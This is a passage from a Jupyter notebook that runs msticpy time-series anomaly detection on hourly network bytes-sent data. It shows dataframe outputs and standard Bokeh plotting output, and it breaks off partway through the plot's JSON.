       "      <td>11111</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>168 rows × 1 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                          TotalBytesSent\n",
       "TimeGenerated                           \n",
       "2020-07-06 00:00:00+00:00          10823\n",
       "2020-07-06 01:00:00+00:00          14821\n",
       "2020-07-06 02:00:00+00:00          13532\n",
       "2020-07-06 03:00:00+00:00          11947\n",
       "2020-07-06 04:00:00+00:00          11193\n",
       "...                                  ...\n",
       "2020-07-12 19:00:00+00:00          18166\n",
       "2020-07-12 20:00:00+00:00          13830\n",
       "2020-07-12 21:00:00+00:00          13350\n",
       "2020-07-12 22:00:00+00:00          11842\n",
       "2020-07-12 23:00:00+00:00          11111\n",
       "\n",
       "[168 rows x 1 columns]"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load test data\n",
    "ts_df = pd.read_pickle('./../data/timeseries.pkl')\n",
    "ts_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:50:16.774537Z",
     "start_time": "2022-10-27T15:50:16.723324Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>TotalBytesSent</th>\n",
       "      <th>residual</th>\n",
       "      <th>trend</th>\n",
       "      <th>seasonal</th>\n",
       "      <th>weights</th>\n",
       "      <th>baseline</th>\n",
       "      <th>score</th>\n",
       "      <th>anomalies</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2020-07-06 00:00:00+00:00</td>\n",
       "      <td>10823</td>\n",
       "      <td>-364</td>\n",
       "      <td>21943</td>\n",
       "      <td>-10756</td>\n",
       "      <td>1</td>\n",
       "      <td>11187</td>\n",
       "      <td>-0.142170</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2020-07-06 01:00:00+00:00</td>\n",
       "      <td>14821</td>\n",
       "      <td>813</td>\n",
       "      <td>21961</td>\n",
       "      <td>-7953</td>\n",
       "      <td>1</td>\n",
       "      <td>14007</td>\n",
       "      <td>0.305033</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2020-07-06 02:00:00+00:00</td>\n",
       "      <td>13532</td>\n",
       "      <td>251</td>\n",
       "      <td>21977</td>\n",
       "      <td>-8697</td>\n",
       "      <td>1</td>\n",
       "      <td>13280</td>\n",
       "      <td>0.091500</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>2020-07-06 03:00:00+00:00</td>\n",
       "      <td>11947</td>\n",
       "      <td>-291</td>\n",
       "      <td>21994</td>\n",
       "      <td>-9756</td>\n",
       "      <td>1</td>\n",
       "      <td>12238</td>\n",
       "      <td>-0.114433</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>2020-07-06 04:00:00+00:00</td>\n",
       "      <td>11193</td>\n",
       "      <td>-121</td>\n",
       "      <td>22010</td>\n",
       "      <td>-10696</td>\n",
       "      <td>1</td>\n",
       "      <td>11314</td>\n",
       "      <td>-0.049841</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>163</th>\n",
       "      <td>2020-07-12 19:00:00+00:00</td>\n",
       "      <td>18166</td>\n",
       "      <td>-1991</td>\n",
       "      <td>14761</td>\n",
       "      <td>5395</td>\n",
       "      <td>1</td>\n",
       "      <td>20157</td>\n",
       "      <td>-0.760350</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>164</th>\n",
       "      <td>2020-07-12 20:00:00+00:00</td>\n",
       "      <td>13830</td>\n",
       "      <td>740</td>\n",
       "      <td>14733</td>\n",
       "      <td>-1643</td>\n",
       "      <td>1</td>\n",
       "      <td>13089</td>\n",
       "      <td>0.277297</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>165</th>\n",
       "      <td>2020-07-12 21:00:00+00:00</td>\n",
       "      <td>13350</td>\n",
       "      <td>655</td>\n",
       "      <td>14702</td>\n",
       "      <td>-2008</td>\n",
       "      <td>1</td>\n",
       "      <td>12694</td>\n",
       "      <td>0.245001</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>166</th>\n",
       "      <td>2020-07-12 22:00:00+00:00</td>\n",
       "      <td>11842</td>\n",
       "      <td>-1202</td>\n",
       "      <td>14670</td>\n",
       "      <td>-1625</td>\n",
       "      <td>1</td>\n",
       "      <td>13044</td>\n",
       "      <td>-0.460569</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>167</th>\n",
       "      <td>2020-07-12 23:00:00+00:00</td>\n",
       "      <td>11111</td>\n",
       "      <td>-376</td>\n",
       "      <td>14636</td>\n",
       "      <td>-3149</td>\n",
       "      <td>1</td>\n",
       "      <td>11487</td>\n",
       "      <td>-0.146729</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>168 rows × 9 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                TimeGenerated  TotalBytesSent  residual  trend  seasonal  \\\n",
       "0   2020-07-06 00:00:00+00:00           10823      -364  21943    -10756   \n",
       "1   2020-07-06 01:00:00+00:00           14821       813  21961     -7953   \n",
       "2   2020-07-06 02:00:00+00:00           13532       251  21977     -8697   \n",
       "3   2020-07-06 03:00:00+00:00           11947      -291  21994     -9756   \n",
       "4   2020-07-06 04:00:00+00:00           11193      -121  22010    -10696   \n",
       "..                        ...             ...       ...    ...       ...   \n",
       "163 2020-07-12 19:00:00+00:00           18166     -1991  14761      5395   \n",
       "164 2020-07-12 20:00:00+00:00           13830       740  14733     -1643   \n",
       "165 2020-07-12 21:00:00+00:00           13350       655  14702     -2008   \n",
       "166 2020-07-12 22:00:00+00:00           11842     -1202  14670     -1625   \n",
       "167 2020-07-12 23:00:00+00:00           11111      -376  14636     -3149   \n",
       "\n",
       "     weights  baseline     score  anomalies  \n",
       "0          1     11187 -0.142170          0  \n",
       "1          1     14007  0.305033          0  \n",
       "2          1     13280  0.091500          0  \n",
       "3          1     12238 -0.114433          0  \n",
       "4          1     11314 -0.049841          0  \n",
       "..       ...       ...       ...        ...  \n",
       "163        1     20157 -0.760350          0  \n",
       "164        1     13089  0.277297          0  \n",
       "165        1     12694  0.245001          0  \n",
       "166        1     13044 -0.460569          0  \n",
       "167        1     11487 -0.146729          0  \n",
       "\n",
       "[168 rows x 9 columns]"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#load the module\n",
    "from msticpy.analysis import timeseries\n",
    "\n",
    "# analyze the time series data and find outliers\n",
    "ts_decomp_df = ts_df.mp_timeseries.analyze(\n",
    "    data_column=\"TotalBytesSent\",\n",
    "    seasonal=7,\n",
    "    period=24\n",
    ")\n",
    "\n",
    "ts_decomp_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:50:21.718751Z",
     "start_time": "2022-10-27T15:50:21.538412Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"1002\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  const force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  const JS_MIME_TYPE = 'application/javascript';\n",
       "  const HTML_MIME_TYPE = 'text/html';\n",
       "  const EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  const CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    const script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    const cell = handle.cell;\n",
       "\n",
       "    const id = cell.output_area._bokeh_element_id;\n",
       "    const server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      const cmd_clean = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd_clean, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            const id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      const cmd_destroy = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd_destroy);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    const output_area = handle.output_area;\n",
       "    const output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    const toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      const bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      const script_attrs = bk_div.children[0].attributes;\n",
       "      for (let i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      const toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      const props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    const events = require('base/js/events');\n",
       "    const OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  const NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    const el = document.getElementById(\"1002\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error(url) {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (let i = 0; i < css_urls.length; i++) {\n",
       "      const url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error.bind(null, url);\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    for (let i = 0; i < js_urls.length; i++) {\n",
       "      const url = js_urls[i];\n",
       "      const element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error.bind(null, url);\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.4.2.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.4.2.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.4.2.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.4.2.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-2.4.2.min.js\"];\n",
       "  const css_urls = [];\n",
       "  \n",
       "\n",
       "  const inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (let i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      const cell = $(document.getElementById(\"1002\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  const force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  const NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    const el = document.getElementById(\"1002\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.4.2.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.4.2.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.4.2.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.4.2.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-2.4.2.min.js\"];\n  const css_urls = [];\n  \n\n  const inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (let i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      const cell = $(document.getElementById(\"1002\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"bd0206b3-1ef4-4301-a7c6-c25f0d9e5cfe\" data-root-id=\"1157\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  const docs_json = {\"0293dcfa-f567-4213-8709-48de9c5c78af\":{\"defs\":[],\"roots\":{\"references\":[{\"attributes\":{\"children\":[{\"id\":\"1005\"},{\"id\":\"1126\"}]},\"id\":\"1157\",\"type\":\"Column\"},{\"attributes\":{\"axis\":{\"id\":\"1137\"},\"coordinates\":null,\"group\":null,\"ticker\":null},\"id\":\"1140\",\"type\":\"Grid\"},{\"attributes\":{\"coordinates\":null,\"group\":null,\"text\":\"Range Selector\"},\"id\":\"1127\",\"type\":\"Title\"},{\"attributes\":{\"bottom_units\":\"screen\",\"coordinates\":null,\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"group\":null,\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"syncable\":false,\"top_units\":\"screen\"},\"id\":\"1029\",\"type\":\"BoxAnnotation\"},{\"attributes\":{},\"id\":\"1133\",\"type\":\"LinearScale\"},{\"attributes\":{\"axis\":{\"id\":\"1020\"},\"coordinates\":null,\"dimension\":1,\"grid_line_color\":null,\"group\":null,\"ticker\":null},\"id\":\"1023\",\"type\":\"Grid\"},{\"attributes\":{\"coordinates\":null,\"formatter\":{\"id\":\"1143\"},\"group\":null,\"major_label_policy\":{\"id\":\"1165\"},\"ticker\":{\"id\":\"1138\"}},\"id\":\"1137\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"axis_label\":\"TotalBytesSent\",\"coordinates\":null,\"formatter\":{\"id\":\"1039\"},\"group\":null,\"major_label_policy\":{\"id\":\"1049\"},\"ticker\":{\"id\":\"1021\"}},\"id\":\"1020\",\"type\":\"LinearAxis\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"1028\",\"type\":\"PanTool\"},{\"attributes\":{\"axis\":{\"id\":\"1016\"},\"coordinates\":null,\"grid_line_color\":null,\"group\":null,\"ticker\":null},\"id\":\"1019\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"1135\",\"type\":\"LinearScale\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1194\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"axis_label\":\"TimeGenerated\",\"coordinates\":null,\"formatter\":{\"id\":\"1037\"},\"group\":null,\"major_label_policy\":{\"id\":\"1051\"},\"ticker\":{\"id\":\"1017\"}},\"id\":\"1016\",\"type\":\"DatetimeAxis\"},{\"attributes\":{},\"id\":\"1131\",\"type\":\"DataRange1d\"},{\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"id\":\"1186\"},{\"id\":\"1187\"},{\"id\":\"1188\"},{\"id\":\"1189\"},{\"id\":\"1190\"},{\"id\":\"1191\"},{\"id\":\"1192\"},{\"id\":\"1193\"},{\"id\":\"1194\"},{\"id\":\"1195\"},{\"id\":\"1196\"},{\"id\":\"1197\"}]},\"id\":\"1138\",\"type\":\"DatetimeTicker\"},{\"attributes\":{},\"id\":\"1010\",\"type\":\"DataRange1d\"},{\"attributes\":{\"below\":[{\"id\":\"1016\"}],\"center\":[{\"id\":\"1019\"},{\"id\":\"1023\"},{\"id\":\"1067\"}],\"height\":300,\"left\":[{\"id\":\"1020\"}],\"min_border_left\":50,\"renderers\":[{\"id\":\"1045\"},{\"id\":\"1073\"},{\"id\":\"1101\"}],\"title\":{\"id\":\"1006\"},\"toolbar\":{\"id\":\"1030\"},\"toolbar_location\":\"above\",\"width\":1200,\"x_range\":{\"id\":\"1008\"},\"x_scale\":{\"id\":\"1012\"},\"y_range\":{\"id\":\"1010\"},\"y_scale\":{\"id\":\"1014\"}},\"id\":\"1005\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"end\":1594684980000.0,\"start\":1593903420000.0},\"id\":\"1129\",\"type\":\"Range1d\"},{\"attributes\":{},\"id\":\"1021\",\"type\":\"BasicTicker\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"1189\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"1165\",\"type\":\"AllLabels\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1187\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"tools\":[{\"id\":\"1004\"},{\"id\":\"1024\"},{\"id\":\"1025\"}